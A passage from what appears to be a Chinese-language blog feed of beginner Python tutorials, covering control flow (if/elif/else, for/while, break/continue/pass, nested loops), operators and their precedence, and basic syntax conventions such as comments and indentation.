    <content type="html"><![CDATA[<h1 id="程序结构">1. 程序结构</h1><p>在编程中，程序结构指的是如何组织和控制代码以实现特定的功能。Python支持多种程序结构，其中一些主要的包括：</p><ol type="1"><li><strong>顺序结构</strong>：顺序结构是最简单的结构，代码按照编写的顺序依次执行。</li><li><strong>分支结构（条件语句）</strong>：分支结构根据条件的真假选择执行不同的代码分支。常见的条件语句是<code>if...elif...else</code>结构，它根据条件的满足情况执行不同的代码块。</li><li><strong>循环结构</strong>：循环结构允许多次执行相同或相似的代码块。Python中有<code>for</code> 和 <code>while</code>循环，分别用于遍历可迭代对象和基于条件的循环。</li><li><strong>函数和模块</strong>：函数是一种可重复使用的代码块，它接收输入并执行特定任务，并返回结果。模块是一组相关的函数和变量的集合，可以被其他程序引用和使用。</li><li><strong>异常处理</strong>：异常处理允许代码在出现异常情况时进行处理，防止程序崩溃。Python中使用 <code>try...except...finally</code> 结构来捕获和处理异常。</li><li><strong>面向对象编程（OOP）</strong>：面向对象编程是一种程序设计思想，将数据和操作数据的方法组合成对象。Python是一种面向对象的语言，支持类、对象、继承等概念。</li></ol><h1 id="选择语句">2 选择语句</h1><h2 id="if语句">2.1 if语句</h2><p><code>if</code>语句是最基本的选择结构，用于根据条件是否为真来执行不同的代码块。语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> 条件:<br>    <span class="hljs-comment"># 如果条件为真，则执行这里的代码块</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 如果条件为假，则执行这里的代码块</span><br></code></pre></td></tr></table></figure><h2 id="if...elif...else语句">2.2 if...elif...else语句</h2><p><code>if...elif...else</code>语句允许根据多个条件依次进行判断。<code>elif</code> 是<code>else if</code> 的缩写，用于检查多个条件。语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> 条件<span class="hljs-number">1</span>:<br>    <span class="hljs-comment"># 如果条件1为真，则执行这里的代码块</span><br><span class="hljs-keyword">elif</span> 条件<span class="hljs-number">2</span>:<br>    <span class="hljs-comment"># 如果条件2为真，则执行这里的代码块</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-comment"># 如果以上条件都为假，则执行这里的代码块</span><br></code></pre></td></tr></table></figure><h2 id="三元条件表达式">2.3 三元条件表达式</h2><p>三元条件表达式是一种紧凑的条件语句，适用于简单的条件判断。语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">result = [表达式为真时的值] <span class="hljs-keyword">if</span> [条件] <span class="hljs-keyword">else</span> [表达式为假时的值]<br></code></pre></td></tr></table></figure><h2 id="选择嵌套">2.4 选择嵌套</h2><p>选择语句可以相互嵌套，这意味着在一个条件块内部包含另一个条件块。这种嵌套结构使得可以在更复杂的情况下进行多层次的条件判断。以下是选择语句嵌套的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">10</span><br>y = <span class="hljs-number">5</span><br><br><span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">5</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x 大于 5&quot;</span>)<br>    <br>    <span class="hljs-keyword">if</span> y &gt; <span class="hljs-number">3</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;y 大于 3&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;y 小于等于 3&quot;</span>)<br>        <br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;x 小于等于 5&quot;</span>)<br></code></pre></td></tr></table></figure><p>在这个例子中，首先检查 <code>x</code> 是否大于5，如果是，则进入第一个 <code>if</code> 块，在此块内部又进行了对<code>y</code> 的条件判断。如果 <code>x</code> 不大于 5，则执行<code>else</code> 块内的代码。</p><p>嵌套选择语句允许根据更复杂的条件结构进行多层次的判断和控制流程，但需要小心保持代码的可读性和简洁性，避免深层次的嵌套导致代码难以理解。</p><h1 id="循环语句">3. 循环语句</h1><h2 id="for循环">3.1 for循环</h2><p><code>for</code>循环用于遍历序列（列表、元组、字符串等）中的每个元素，并执行特定的代码块。语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> 变量 <span class="hljs-keyword">in</span> 序列:<br>    <span class="hljs-comment"># 执行代码块，针对每个元素执行一次</span><br></code></pre></td></tr></table></figure><h2 id="while循环">3.2 while循环</h2><p><code>while</code>循环根据条件是否为真来重复执行代码块，直到条件变为假为止。语法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">while</span> 条件:<br>    <span class="hljs-comment"># 在条件为真时重复执行代码块</span><br></code></pre></td></tr></table></figure><h2 id="breakcontinuepass">3.3 break、continue、pass</h2><p>在 Python 中，<code>break</code>、<code>continue</code> 和<code>pass</code> 是用于控制流程的特殊语句。</p><h3 id="break语句">3.3.1 break语句</h3><p><code>break</code> 语句用于跳出当前所在的循环（for 或 while循环），不再执行循环中剩余的代码，直接跳出整个循环体。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>以上代码将输出： <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">0<br>1<br>2<br></code></pre></td></tr></table></figure></p><p>在 <code>i</code> 的值等于 <code>3</code> 时，<code>break</code>被执行，循环立即终止。</p><h3 id="continue语句">3.3.2 continue语句</h3><p><code>continue</code>语句用于结束当前循环的迭代，跳过循环体中剩余的代码，进入下一次迭代。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>以上代码将输出： <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">0<br>1<br>3<br>4<br></code></pre></td></tr></table></figure></p><p>在 <code>i</code> 的值等于 <code>2</code> 时，<code>continue</code>被执行，直接进入下一次迭代，跳过了 <code>print(i)</code> 这一步。</p><h3 id="pass语句">3.3.3 pass语句</h3><p><code>pass</code> 是一个空操作，它表示不执行任何操作。在 Python中，它用作语法上的占位符，保证语法的完整性，但不执行任何操作。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">if</span> i == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(i)<br></code></pre></td></tr></table></figure><p>以上代码将输出： <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">0<br>1<br>3<br>4<br></code></pre></td></tr></table></figure></p><p>当 <code>i</code> 的值等于 <code>2</code> 时，<code>pass</code>被执行，不做任何操作，然后继续循环。</p><h2 id="循环嵌套">3.4 循环嵌套</h2><p>循环嵌套是指在一个循环内部包含另一个循环。在Python中，可以通过在一个循环内部放置另一个循环来实现嵌套。</p><p><strong>嵌套的for循环</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;外层循环变量 i = <span class="hljs-subst">&#123;i&#125;</span>, 内层循环变量 j = <span class="hljs-subst">&#123;j&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>上述代码展示了一个嵌套的 <code>for</code> 循环。外层循环迭代<code>i</code>，内层循环迭代<code>j</code>。内层循环会在外层每次迭代时执行。</p><p><strong>嵌套的while循环</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i &lt; <span class="hljs-number">3</span>:<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> j &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;外层循环变量 i = <span class="hljs-subst">&#123;i&#125;</span>, 内层循环变量 j = <span class="hljs-subst">&#123;j&#125;</span>&quot;</span>)<br>        j += <span class="hljs-number">1</span><br>    i += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这个例子演示了嵌套的 <code>while</code> 循环。外层循环由<code>i</code> 控制，内层循环由 <code>j</code>控制。内层循环会在外层每次迭代时执行。</p><p>嵌套循环允许在内层循环中执行更多的迭代，这种结构通常用于处理二维数据、模拟多层结构等需要多重迭代的情况。要小心使用嵌套循环，因为多重循环可能会导致代码执行时间较长，影响性能。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>基础篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>运算符与表达式</title>
    <link href="/2023/12/04/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%B8%8E%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2023/12/04/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E8%BF%90%E7%AE%97%E7%AC%A6%E4%B8%8E%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="运算符">1. 运算符</h1><h2 id="算术运算符">1.1 算术运算符</h2><ol type="1"><li><p><strong>加法 <code>+</code></strong>：用于相加两个数。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">5</span> + <span class="hljs-number">3</span>  <span class="hljs-comment"># a 的值为 8</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>减法 <code>-</code></strong>：用于相减两个数。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">b = <span class="hljs-number">7</span> - <span class="hljs-number">2</span>  <span class="hljs-comment"># b 的值为 5</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>乘法 <code>*</code></strong>：用于相乘两个数。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">c = <span class="hljs-number">4</span> * <span class="hljs-number">6</span>  <span class="hljs-comment"># c 的值为 24</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>除法 <code>/</code></strong>：用于相除两个数。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">d = <span class="hljs-number">15</span> / <span class="hljs-number">3</span>  <span class="hljs-comment"># d 的值为 5.0 (Python 3 中除法结果默认为浮点数)</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>整数除法 <code>//</code></strong>：返回除法的整数部分。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">e = <span class="hljs-number">15</span> // <span class="hljs-number">3</span>  <span class="hljs-comment"># e 的值为 5</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>取模运算 <code>%</code></strong>：返回除法的余数。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-number">17</span> % <span class="hljs-number">4</span>  <span class="hljs-comment"># f 的值为 1 (17 除以 4 的余数是 1)</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>幂运算 <code>**</code></strong>：用于计算一个数的幂。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">g = <span class="hljs-number">2</span> ** <span class="hljs-number">3</span>  <span class="hljs-comment"># g 的值为 8 (2 的 3次方)</span><br></code></pre></td></tr></table></figure></p></li></ol><h2 id="赋值运算符">1.2 赋值运算符</h2><p>赋值运算符用于将值赋给变量。它们不仅仅是把一个值赋给一个变量，还可以与其他运算符一起使用来对变量进行操作并赋值。以下是常见的赋值运算符：</p><ol type="1"><li><p><strong>等号 <code>=</code></strong>：将右侧的值赋给左侧的变量。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">5</span>  <span class="hljs-comment"># 将值 5 赋给变量 x</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>复合赋值运算符（例如 <code>+=</code>, <code>-=</code>,<code>*=</code>, <code>/=</code>, <code>%=</code>,<code>**=</code>,<code>//=</code>）</strong>：将运算符右侧的值和左侧的变量进行运算，并将结果赋给左侧的变量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">y = <span class="hljs-number">10</span><br>y += <span class="hljs-number">3</span>  <span class="hljs-comment"># 相当于 y = y + 3，结果是 y 的值变成 13</span><br></code></pre></td></tr></table></figure></li><li><p><strong>多重赋值</strong>：在一行内为多个变量赋值。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a, b = <span class="hljs-number">5</span>, <span class="hljs-number">10</span>  <span class="hljs-comment"># a 的值是 5，b 的值是 10</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>链式赋值</strong>：将同一个值赋给多个变量。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">c = d = <span class="hljs-number">20</span>  <span class="hljs-comment"># c 和 d 的值都是 20</span><br></code></pre></td></tr></table></figure></p></li></ol><h2 id="比较关系运算符">1.3 比较（关系）运算符</h2><p>比较运算符用于比较两个值，并返回一个布尔值（True或False），表示比较的结果是否成立。下面是常见的比较运算符：</p><ol type="1"><li><p><strong>等于 <code>==</code></strong>：检查两个值是否相等。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">a = <span class="hljs-number">5</span><br>b = <span class="hljs-number">7</span><br>result = (a == b)  <span class="hljs-comment"># result 的值为 False</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>不等于 <code>!=</code></strong>：检查两个值是否不相等。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">10</span><br>y = <span class="hljs-number">5</span><br>result = (x != y)  <span class="hljs-comment"># result 的值为 True</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>大于<code>&gt;</code></strong>：检查左侧的值是否大于右侧的值。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">m = <span class="hljs-number">15</span><br>n = <span class="hljs-number">10</span><br>result = (m &gt; n)  <span class="hljs-comment"># result 的值为 True</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>小于<code>&lt;</code></strong>：检查左侧的值是否小于右侧的值。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">3</span><br>q = <span class="hljs-number">6</span><br>result = (p &lt; q)  <span class="hljs-comment"># result 的值为 True</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>大于等于<code>&gt;=</code></strong>：检查左侧的值是否大于或等于右侧的值。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">r = <span class="hljs-number">8</span><br>s = <span class="hljs-number">8</span><br>result = (r &gt;= s)  <span class="hljs-comment"># result 的值为 True</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>小于等于<code>&lt;=</code></strong>：检查左侧的值是否小于或等于右侧的值。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">t = <span class="hljs-number">4</span><br>u = <span class="hljs-number">7</span><br>result = (t &lt;= u)  <span class="hljs-comment"># result 的值为 True</span><br></code></pre></td></tr></table></figure></p></li></ol><h2 id="逻辑运算符">1.4 逻辑运算符</h2><p>逻辑运算符用于对布尔值进行操作，可以将多个条件结合起来进行逻辑运算。Python中常见的逻辑运算符包括：</p><ol type="1"><li><p><strong>与运算<code>and</code></strong>：当且仅当所有条件都为真时，结果为真。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">5</span><br>result = (x &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">and</span> (x &lt; <span class="hljs-number">10</span>)  <span class="hljs-comment"># result 的值为 True</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>或运算<code>or</code></strong>：只要有一个条件为真，结果就为真。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">y = <span class="hljs-number">14</span><br>result = (y &lt; <span class="hljs-number">10</span>) <span class="hljs-keyword">or</span> (y % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)  <span class="hljs-comment"># result 的值为 True</span><br></code></pre></td></tr></table></figure></p></li><li><p><strong>非运算<code>not</code></strong>：用于取反一个条件的值，如果条件为真，则返回假；如果条件为假，则返回真。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">z = <span class="hljs-number">7</span><br>result = <span class="hljs-keyword">not</span> (z == <span class="hljs-number">10</span>)  <span class="hljs-comment"># result 的值为 True</span><br></code></pre></td></tr></table></figure></p></li></ol><h2 id="位运算符">1.5 位运算符</h2><p>位运算符用于对整数在二进制形式下的位进行操作。在Python中，有几个常见的位运算符：</p><p><strong>按位与 <code>&amp;</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">result_and = <span class="hljs-number">0b1010</span> &amp; <span class="hljs-number">0b1100</span>  <span class="hljs-comment"># 0b1010 表示十进制的 10，0b1100 表示十进制的 12</span><br><span class="hljs-comment"># 10 的二进制是 1010，12 的二进制是 1100，按位与操作结果是 1000（十进制为 8）</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bin</span>(result_and))  <span class="hljs-comment"># 输出：0b1000</span><br></code></pre></td></tr></table></figure><p><strong>按位或 <code>|</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">result_or = <span class="hljs-number">0b1010</span> | <span class="hljs-number">0b1100</span><br><span class="hljs-comment"># 10 的二进制是 1010，12 的二进制是 1100，按位或操作结果是 1110（十进制为 14）</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bin</span>(result_or))  <span class="hljs-comment"># 输出：0b1110</span><br></code></pre></td></tr></table></figure><p><strong>按位异或 <code>^</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">result_xor = <span class="hljs-number">0b1010</span> ^ <span class="hljs-number">0b1100</span><br><span class="hljs-comment"># 10 的二进制是 1010，12 的二进制是 1100，按位异或操作结果是 0110（十进制为 6）</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bin</span>(result_xor))  <span class="hljs-comment"># 输出：0b110</span><br></code></pre></td></tr></table></figure><p><strong>按位取反 <code>~</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">result_complement = ~<span class="hljs-number">0b1010</span><br><span class="hljs-comment"># 10 的二进制是 1010，按位取反操作结果是 -11（在二进制中表示为 -0b1011）</span><br><span class="hljs-comment"># 按位取反操作是对整数的二进制补码进行取反操作，但需要注意结果可能是负数，并且在 Python 中输出的形式是以 - 符号和补码形式的二进制来表示。</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bin</span>(result_complement))  <span class="hljs-comment"># 输出：-0b1011</span><br></code></pre></td></tr></table></figure><p><strong>左移 <code>&lt;&lt;</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">result_left_shift = <span class="hljs-number">0b1010</span> &lt;&lt; <span class="hljs-number">2</span><br><span class="hljs-comment"># 10 的二进制是 1010，向左移动两位结果是 101000（十进制为 40）</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bin</span>(result_left_shift))  <span class="hljs-comment"># 输出：0b101000</span><br></code></pre></td></tr></table></figure><p><strong>右移 <code>&gt;&gt;</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">result_right_shift = <span class="hljs-number">0b1010</span> &gt;&gt; <span class="hljs-number">1</span><br><span class="hljs-comment"># 10 的二进制是 1010，向右移动一位结果是 101（十进制为 5）</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bin</span>(result_right_shift))  <span class="hljs-comment"># 输出：0b101</span><br></code></pre></td></tr></table></figure><h1 id="运算符优先级">2. 运算符优先级</h1><p>在 Python中，不同的运算符有不同的优先级。当一个表达式中有多个运算符时，Python会根据优先级规则来确定计算顺序。以下是常见运算符的优先级，从高到低排列：</p><ol type="1"><li><strong>括号<code>()</code></strong>（最高优先级）：括号中的表达式优先计算。</li><li><strong>指数运算 <code>**</code></strong>：例如，<code>2 ** 3</code>表示 2 的 3 次方。</li><li><strong>按位取反 <code>~</code></strong></li><li><strong>正负号 <code>+x</code>, <code>-x</code></strong></li><li><strong>乘法、除法、取模、整除 <code>*</code>, <code>/</code>,<code>%</code>, <code>//</code></strong></li><li><strong>加法和减法 <code>+</code>, <code>-</code></strong></li><li><strong>按位左移、按位右移 <code>&lt;&lt;</code>,<code>&gt;&gt;</code></strong></li><li><strong>按位与 <code>&amp;</code></strong></li><li><strong>按位异或 <code>^</code></strong></li><li><strong>按位或 <code>|</code></strong></li><li><strong>比较运算符 <code>==</code>, <code>!=</code>,<code>&gt;</code>, <code>&lt;</code>, <code>&gt;=</code>,<code>&lt;=</code></strong></li><li><strong>逻辑运算符 <code>not</code>, <code>and</code>,<code>or</code></strong>（逻辑运算符的优先级低于比较运算符）</li></ol><p>如果在一个表达式中含有多个运算符，Python将按照上述优先级顺序进行计算。当优先级相同时，Python会从左向右计算表达式。为了避免混淆，建议在复杂的表达式中使用括号来明确计算顺序。</p><h1 id="条件表达式">3. 条件表达式</h1><p>条件表达式是一种在单行代码中根据条件选择不同操作的方式。在 Python中，条件表达式也被称为三元运算符，它使用了类似于数学中的三元操作符的语法结构。其基本形式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">result = [表达式为真时的值] <span class="hljs-keyword">if</span> [条件] <span class="hljs-keyword">else</span> [表达式为假时的值]<br></code></pre></td></tr></table></figure><p>这种结构允许根据条件的真假来选择不同的值。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">5</span><br>y = <span class="hljs-number">10</span><br>result = x <span class="hljs-keyword">if</span> x &gt; y <span class="hljs-keyword">else</span> y  <span class="hljs-comment"># 如果 x 大于 y，则 result 等于 x，否则等于 y</span><br><span class="hljs-built_in">print</span>(result)  <span class="hljs-comment"># 输出：10（因为 x 小于 y）</span><br></code></pre></td></tr></table></figure><p>在这个例子中，如果 <code>x</code> 大于 <code>y</code>，则<code>result</code> 的值为 <code>x</code>，否则 <code>result</code>的值为 <code>y</code>。</p><p>条件表达式通常用于简洁地表示基于条件进行赋值或操作的情况。但过度使用条件表达式可能会降低代码的可读性，因此在确保代码可读性的前提下使用它们会更好。</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>基础篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>语言基础</title>
    <link href="/2023/12/04/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/12/04/Python/%E5%9F%BA%E7%A1%80%E7%AF%87/%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="语法特点">1. 语法特点</h1><h2 id="注释规则">1.1 注释规则</h2><h3 id="单行注释">1.1.1 单行注释</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 单行注释</span><br></code></pre></td></tr></table></figure><h3 id="多行注释">1.1.2 多行注释</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">多行注释</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">多行注释</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="文件编码声明注释">1.1.3 文件编码声明注释</h3><p>在Python3中，默认编码为UTF-8。如果不想使用默认编码，就需要在文件的第一行声明文件的编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#-*-coding:gbk-*-</span><br><span class="hljs-keyword">or</span><br><span class="hljs-comment">#coding=gbk</span><br></code></pre></td></tr></table></figure><h2 id="代码缩进">1.2 代码缩进</h2><p>Python采用代码缩进和冒号区分代码之间的层次。行尾的冒号和下一行的缩进表示一个代码块的开始；而缩进结束，则表示一个代码块的结束。缩进可采用空格或Tab键实现。</p><h2 id="编码规范">1.3 编码规范</h2><h3 id="编写规则">1.3.1 编写规则</h3><ul><li>每个import语句只导入一个模块；</li><li>不要在行尾添加分号；</li><li>建议每行不超过80个字符（不超出屏幕大小）；</li><li>使用空行增加代码可读性；</li><li>避免在循环中使用+和+=操作符累加字符串。</li></ul><h3 id="命名规范">1.3.2 